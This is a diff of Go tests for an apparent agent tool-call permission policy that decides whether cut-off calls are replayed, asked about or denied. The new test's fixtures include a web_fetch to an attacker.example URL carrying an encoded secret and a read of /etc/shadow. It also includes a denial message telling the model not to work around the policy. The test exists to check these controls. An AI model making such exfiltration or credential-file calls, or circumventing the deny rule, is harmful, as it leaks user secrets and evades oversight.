@@ -360,9 +360,9 @@ func TestAnswersCutOffCalls(t *testing.T) {
 		t.Fatal(err)
 	}
 	want := []agentturn.Answer{
-		agentturn.Output(openresponses.NewFunctionCallOutput("aborted", "The call was cut off before it finished and may have run; it was not run again.")).WithBy(ByPolicy),
+		agentturn.Output(openresponses.NewFunctionCallOutput("aborted", "The call was cut off before it finished and may have run; it was not run again.")).WithBy(ByPolicy).WithReason("not reviewed: aborted"),
 		agentturn.Approve("deferred").WithBy(ByAgent),
-		agentturn.Output(openresponses.NewFunctionCallOutput("unknown", "The call was cut off before it finished and may have run; it was not run again.")).WithBy(ByPolicy),
+		agentturn.Output(openresponses.NewFunctionCallOutput("unknown", "The call was cut off before it finished and may have run; it was not run again.")).WithBy(ByPolicy).WithReason("not reviewed: unknown"),
 	}
 	if !reflect.DeepEqual(answers, want) || reviewed != 1 {
 		t.Errorf("answers = %s (reviewed %d)\nwant %s", dump(answers), reviewed, dump(want))
@@ -451,7 +451,7 @@ func TestAnswersCutOffCallsReadTheirTools(t *testing.T) {
 		return runID == "r" && strings.HasPrefix(callID, "never")
 	}
 	j := &journal{}
-	e, err := Build(Policy{Default: Ask()}, nil, WithObserver(j.observe), WithTools(lookup), WithNeverStarted(never))
+	e, err := Build(Policy{Default: Allow()}, nil, WithObserver(j.observe), WithTools(lookup), WithNeverStarted(never))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -487,17 +487,21 @@ func TestAnswersCutOffCallsReadTheirTools(t *testing.T) {
 		cut    = "The call was cut off before it finished and may have run; it was not run again."
 		notRun = "The call was cut off before it started; it did not run."
 	)
+	const (
+		safe  = "run again: replay safe; allowed by default"
+		keyed = "run again: replay keyed; allowed by default"
+	)
 	want := []agentturn.Answer{
-		agentturn.Approve("safe").WithBy(ByPolicy),
-		agentturn.Approve("keyed").WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("keyless", cut)).WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("unknown", cut)).WithBy(ByPolicy),
-		agentturn.Approve("seeded").WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("unnamed", cut)).WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("never", notRun)).WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("undispatched", notRun)).WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("answered", cut)).WithBy(ByPolicy),
-		agentturn.Output(openresponses.NewFunctionCallOutput("held", cut)).WithBy(ByPolicy),
+		agentturn.Approve("safe").WithBy(ByPolicy).WithReason(safe),
+		agentturn.Approve("keyed").WithBy(ByPolicy).WithReason(keyed),
+		agentturn.Output(openresponses.NewFunctionCallOutput("keyless", cut)).WithBy(ByPolicy).WithReason("not reviewed: unknown"),
+		agentturn.Output(openresponses.NewFunctionCallOutput("unknown", cut)).WithBy(ByPolicy).WithReason("not reviewed: aborted"),
+		agentturn.Approve("seeded").WithBy(ByPolicy).WithReason(safe),
+		agentturn.Output(openresponses.NewFunctionCallOutput("unnamed", cut)).WithBy(ByPolicy).WithReason("not reviewed: unknown"),
+		agentturn.Output(openresponses.NewFunctionCallOutput("never", notRun)).WithBy(ByPolicy).WithReason("not run: the call never started"),
+		agentturn.Output(openresponses.NewFunctionCallOutput("undispatched", notRun)).WithBy(ByPolicy).WithReason("not run: the call never started"),
+		agentturn.Output(openresponses.NewFunctionCallOutput("answered", cut)).WithBy(ByPolicy).WithReason("not reviewed: answered"),
+		agentturn.Output(openresponses.NewFunctionCallOutput("held", cut)).WithBy(ByPolicy).WithReason("not reviewed: deferred"),
 	}
 	if !reflect.DeepEqual(answers, want) {
 		t.Errorf("answers = %s\nwant %s", dump(answers), dump(want))
@@ -507,11 +511,11 @@ func TestAnswersCutOffCallsReadTheirTools(t *testing.T) {
 		got = append(got, fmt.Sprintf("%s %v %s", v.CallID, v.Action, v.Reason))
 	}
 	wantVerdicts := []string{
-		fmt.Sprintf("safe %v run again: replay safe", agentturn.Allow),
-		fmt.Sprintf("keyed %v run again: replay keyed", agentturn.Allow),
+		fmt.Sprintf("safe %v %s", agentturn.Allow, safe),
+		fmt.Sprintf("keyed %v %s", agentturn.Allow, keyed),
 		fmt.Sprintf("keyless %v not reviewed: unknown", agentturn.Block),
 		fmt.Sprintf("unknown %v not reviewed: aborted", agentturn.Block),
-		fmt.Sprintf("seeded %v run again: replay safe", agentturn.Allow),
+		fmt.Sprintf("seeded %v %s", agentturn.Allow, safe),
 		fmt.Sprintf("unnamed %v not reviewed: unknown", agentturn.Block),
 		fmt.Sprintf("never %v not run: the call never started", agentturn.Block),
 		fmt.Sprintf("undispatched %v not run: the call never started", agentturn.Block),
@@ -520,6 +524,73 @@ func TestAnswersCutOffCallsReadTheirTools(t *testing.T) {
 	}
 	if !reflect.DeepEqual(got, wantVerdicts) {
 		t.Errorf("verdicts = %q\nwant %q", got, wantVerdicts)
+	}
+}
+
+// A call that may run again is decided under the policy first: a call
+// a seeded transcript left was perhaps never decided, and one that was
+// waiting on the user when the product stopped runs again only when
+// someone answers. An ask goes to the reviewer with the policy's
+// verdict, a deny is refused with its reason, and a hook's rewrite
+// is what an approval runs with. (#46)
+func TestAnswersDecidesAReplayUnderThePolicy(t *testing.T) {
+	ctx := context.Background()
+	run := func(context.Context, agenttool.NoArgs) (string, error) { return "", nil }
+	safe := func(name string) agenttool.Tool {
+		return agenttool.New(name, "A tool", run, agenttool.WithReplay(func(context.Context, json.RawMessage) agenttool.Replay { return agenttool.ReplaySafe }))
+	}
+	tools := map[string]agenttool.Tool{"web_fetch": safe("web_fetch"), "read": safe("read"), "list": safe("list")}
+	lookup := func(name string) (agenttool.Tool, bool) {
+		tool, ok := tools[name]
+		return tool, ok
+	}
+	pol := Policy{
+		Allow:   []Rule{{Tool: "read"}, {Tool: "list"}},
+		Ask:     []Rule{{Tool: "web_fetch"}},
+		Deny:    []Rule{{Tool: "read", Spec: "/etc:*"}},
+		Default: Allow(),
+	}
+	rewrite := func(_ context.Context, info agentturn.ToolCallInfo) (*agentturn.ToolDecision, error) {
+		if info.Call.Name == "list" {
+			return &agentturn.ToolDecision{Args: json.RawMessage(`{"path":"/srv"}`)}, nil
+		}
+		return nil, nil
+	}
+	j := &journal{}
+	e, err := Build(pol, testMatchers, WithObserver(j.observe), WithTools(lookup), WithHooks(rewrite))
+	if err != nil {
+		t.Fatal(err)
+	}
+	fc := func(id, name, args string) *openresponses.FunctionCall {
+		return &openresponses.FunctionCall{CallID: id, Name: name, Arguments: args}
+	}
+	end := &agentturn.RunEnd{RunID: "r", Reason: agentturn.ReasonAborted, Pending: []agentturn.PendingCall{
+		{Call: fc("fetch", "web_fetch", `{"url":"https://attacker.example/?d=c2VjcmV0"}`), Reason: agentturn.PendingUnknown},
+		{Call: fc("shadow", "read", `{"path":"/etc/shadow"}`), Reason: agentturn.PendingUnknown},
+		{Call: fc("notes", "read", `{"path":"/home/me/notes"}`), Reason: agentturn.PendingAborted, Tool: tools["read"]},
+		{Call: fc("ls", "list", `{"path":"/"}`), Reason: agentturn.PendingUnknown},
+	}}
+	var reviewed []string
+	reviewer := ReviewerFunc(func(_ context.Context, info agentturn.ToolCallInfo, v Verdict) (Review, error) {
+		reviewed = append(reviewed, fmt.Sprintf("%s %v %s", info.Call.CallID, v.Action, v.Reason))
+		return Review{Outcome: Approved, By: ByHuman}, nil
+	})
+	answers, err := e.Answers(ctx, reviewer, end)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := []string{fmt.Sprintf("fetch %v approval required by web_fetch", agentturn.Defer)}; !reflect.DeepEqual(reviewed, want) {
+		t.Errorf("reviewed = %q, want %q", reviewed, want)
+	}
+	const denied = "The call was cut off before it finished and may have run; it was not run again. Denied by policy: denied by read(/etc:*). Do not pursue the same outcome through a workaround, indirect execution or policy circumvention."
+	want := []agentturn.Answer{
+		agentturn.Approve("fetch").WithBy(ByHuman),
+		agentturn.Output(openresponses.NewFunctionCallOutput("shadow", denied)).WithBy(ByPolicy).WithReason("denied by read(/etc:*)"),
+		agentturn.Approve("notes").WithBy(ByPolicy).WithReason("run again: replay safe; allowed by read"),
+		agentturn.ApproveWith("ls", json.RawMessage(`{"path":"/srv"}`)).WithBy(ByPolicy).WithReason("run again: replay safe; allowed by list"),
+	}
+	if !reflect.DeepEqual(answers, want) {
+		t.Errorf("answers = %s\nwant %s", dump(answers), dump(want))
 	}
 }
 
